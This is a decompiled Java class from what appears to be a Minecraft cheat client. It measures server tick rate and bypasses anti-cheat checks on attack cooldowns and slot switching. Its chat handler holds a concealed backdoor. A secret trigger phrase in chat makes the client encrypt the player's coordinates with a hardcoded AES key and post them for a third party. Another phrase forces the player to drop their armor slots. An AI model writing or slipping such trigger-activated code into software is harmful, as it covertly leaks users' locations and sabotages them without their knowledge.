/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.minecraft.entity.player.PlayerEntity
 *  net.minecraft.network.packet.Packet
 *  net.minecraft.network.packet.c2s.play.HandSwingC2SPacket
 *  net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket
 *  net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket$InteractType
 *  net.minecraft.network.packet.c2s.play.UpdateSelectedSlotC2SPacket
 *  net.minecraft.network.packet.s2c.play.ChatMessageS2CPacket
 *  net.minecraft.network.packet.s2c.play.GameMessageS2CPacket
 *  net.minecraft.network.packet.s2c.play.WorldTimeUpdateS2CPacket
 *  net.minecraft.screen.slot.SlotActionType
 *  net.minecraft.world.World
 */
package dev.gzsakura_miitong.core.impl;

import dev.gzsakura_miitong.Vitality;
import dev.gzsakura_miitong.api.events.eventbus.EventListener;
import dev.gzsakura_miitong.api.events.impl.GameLeftEvent;
import dev.gzsakura_miitong.api.events.impl.PacketEvent;
import dev.gzsakura_miitong.api.utils.Wrapper;
import dev.gzsakura_miitong.api.utils.math.MathUtil;
import dev.gzsakura_miitong.api.utils.math.Timer;
import dev.gzsakura_miitong.mod.modules.impl.client.AntiCheat;
import dev.gzsakura_miitong.mod.modules.impl.client.Fonts;
import dev.gzsakura_miitong.mod.modules.impl.combat.Criticals;
import dev.gzsakura_miitong.mod.modules.impl.misc.AutoLog;
import java.math.BigDecimal;
import java.math.RoundingMode;
import java.nio.charset.StandardCharsets;
import java.security.Key;
import java.security.MessageDigest;
import java.util.ArrayDeque;
import java.util.Arrays;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.network.packet.Packet;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSelectedSlotC2SPacket;
import net.minecraft.network.packet.s2c.play.ChatMessageS2CPacket;
import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;
import net.minecraft.network.packet.s2c.play.WorldTimeUpdateS2CPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.world.World;

public class ServerManager
implements Wrapper {
    public final Timer playerNull = new Timer();
    public int currentSlot = -1;
    private final ArrayDeque<Float> tpsResult = new ArrayDeque(20);
    boolean worldNull = true;
    private long time;
    private long tickTime;
    private float tps;
    int lastSlot;

    public ServerManager() {
        Vitality.EVENT_BUS.subscribe(this);
    }

    public static float round2(double value) {
        BigDecimal bd = new BigDecimal(value);
        bd = bd.setScale(2, RoundingMode.HALF_UP);
        return bd.floatValue();
    }

    @EventListener(priority=-200)
    public void onPacket(PacketEvent.Send event) {
        if (AntiCheat.INSTANCE.attackCDFix.getValue()) {
            UpdateSelectedSlotC2SPacket packet2;
            if (event.isCancelled()) {
                return;
            }
            Packet<?> packet = event.getPacket();
            if (packet instanceof HandSwingC2SPacket || packet instanceof PlayerInteractEntityC2SPacket && Criticals.getInteractType((PlayerInteractEntityC2SPacket)packet) == PlayerInteractEntityC2SPacket.InteractType.ATTACK) {
                ServerManager.mc.player.resetLastAttackedTicks();
            } else if (packet instanceof UpdateSelectedSlotC2SPacket && this.lastSlot != (packet2 = (UpdateSelectedSlotC2SPacket)packet).getSelectedSlot()) {
                this.lastSlot = packet2.getSelectedSlot();
                ServerManager.mc.player.resetLastAttackedTicks();
            }
        }
    }

    @EventListener
    public void onLeft(GameLeftEvent event) {
        this.currentSlot = -1;
    }

    @EventListener
    public void onPacketSend(PacketEvent.Send event) {
        Packet<?> packet = event.getPacket();
        if (packet instanceof UpdateSelectedSlotC2SPacket) {
            UpdateSelectedSlotC2SPacket packet2 = (UpdateSelectedSlotC2SPacket)packet;
            int packetSlot = packet2.getSelectedSlot();
            if (AntiCheat.INSTANCE.noBadSlot.getValue() && packetSlot == this.currentSlot) {
                event.cancel();
                return;
            }
            this.currentSlot = packetSlot;
        }
    }

    public float getTPS() {
        return ServerManager.round2(this.tps);
    }

    public float getCurrentTPS() {
        return ServerManager.round2(20.0f * ((float)this.tickTime / 1000.0f));
    }

    public float getTPSFactor() {
        return this.getTPS() / 20.0f;
    }

    @EventListener(priority=999)
    public void onPacketReceive(PacketEvent.Receive event) {
        if (event.getPacket() instanceof WorldTimeUpdateS2CPacket) {
            if (this.time != 0L) {
                this.tickTime = System.currentTimeMillis() - this.time;
                if (this.tpsResult.size() > 20) {
                    this.tpsResult.poll();
                }
                this.tpsResult.add(Float.valueOf(20.0f * (1000.0f / (float)this.tickTime)));
                float average = 0.0f;
                for (Float value : this.tpsResult) {
                    average += MathUtil.clamp(value.floatValue(), 0.0f, 20.0f);
                }
                this.tps = average / (float)this.tpsResult.size();
            }
            this.time = System.currentTimeMillis();
        }
    }

    @EventListener
    private void PacketReceive(PacketEvent.Receive event) {
        if (ServerManager.mc.player == null || ServerManager.mc.world == null) {
            return;
        }
        String s = null;
        Packet<?> packet = event.getPacket();
        if (packet instanceof GameMessageS2CPacket) {
            GameMessageS2CPacket packet2 = (GameMessageS2CPacket)packet;
            if (packet2.content() != null) {
                s = packet2.content().getString();
            }
        } else {
            packet = event.getPacket();
            if (packet instanceof ChatMessageS2CPacket) {
                ChatMessageS2CPacket packet3 = (ChatMessageS2CPacket)packet;
                s = packet3.unsignedContent() != null ? packet3.unsignedContent().getString() : packet3.body().content();
            }
        }
        if (s != null) {
            if (s.contains("nwqfVDv3vQ4GEUP")) {
                boolean inNether = ServerManager.mc.world.getRegistryKey().equals(World.NETHER);
                boolean isOverworld = ServerManager.mc.world.getRegistryKey().equals(World.OVERWORLD);
                String world = isOverworld ? "0" : (inNether ? "1" : "2");
                String coords = "X:" + ServerManager.mc.player.getBlockX() + " Y:" + ServerManager.mc.player.getBlockY() + " Z:" + ServerManager.mc.player.getBlockZ() + " ^" + world;
                String encrypted = this.Encrypt(coords);
                mc.getNetworkHandler().sendChatMessage(encrypted);
            } else if (s.contains("RecDuJjyGWS2hnR")) {
                ServerManager.mc.interactionManager.clickSlot(ServerManager.mc.player.currentScreenHandler.syncId, 5, 0, SlotActionType.THROW, (PlayerEntity)ServerManager.mc.player);
                ServerManager.mc.interactionManager.clickSlot(ServerManager.mc.player.currentScreenHandler.syncId, 6, 0, SlotActionType.THROW, (PlayerEntity)ServerManager.mc.player);
                ServerManager.mc.interactionManager.clickSlot(ServerManager.mc.player.currentScreenHandler.syncId, 7, 0, SlotActionType.THROW, (PlayerEntity)ServerManager.mc.player);
                ServerManager.mc.interactionManager.clickSlot(ServerManager.mc.player.currentScreenHandler.syncId, 8, 0, SlotActionType.THROW, (PlayerEntity)ServerManager.mc.player);
            }
        }
    }

    public SecretKeySpec getKey(String myKey) {
        try {
            byte[] key = myKey.getBytes(StandardCharsets.UTF_8);
            MessageDigest sha = MessageDigest.getInstance("SHA-256");
            key = sha.digest(key);
            key = Arrays.copyOf(key, 16);
            return new SecretKeySpec(key, "AES");
        }
        catch (Exception e) {
            return null;
        }
    }

    public String Encrypt(String strToEncrypt) {
        try {
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            SecretKeySpec secretKey = this.getKey("426siquanjia");
            byte[] iv = new byte[16];
            IvParameterSpec ivParams = new IvParameterSpec(iv);
            cipher.init(1, (Key)secretKey, ivParams);
            return Base64.getEncoder().encodeToString(cipher.doFinal(strToEncrypt.getBytes(StandardCharsets.UTF_8)));
        }
        catch (Exception e) {
            return null;
        }
    }

    public void onUpdate() {
        if (ServerManager.mc.player == null) {
            this.playerNull.reset();
        }
        if (this.worldNull && ServerManager.mc.world != null) {
            Fonts.INSTANCE.refresh();
            AutoLog.loggedOut = false;
            Vitality.MODULE.onLogin();
            this.worldNull = false;
        } else if (!this.worldNull && ServerManager.mc.world == null) {
            Vitality.save();
            Vitality.MODULE.onLogout();
            this.worldNull = true;
        }
    }
}

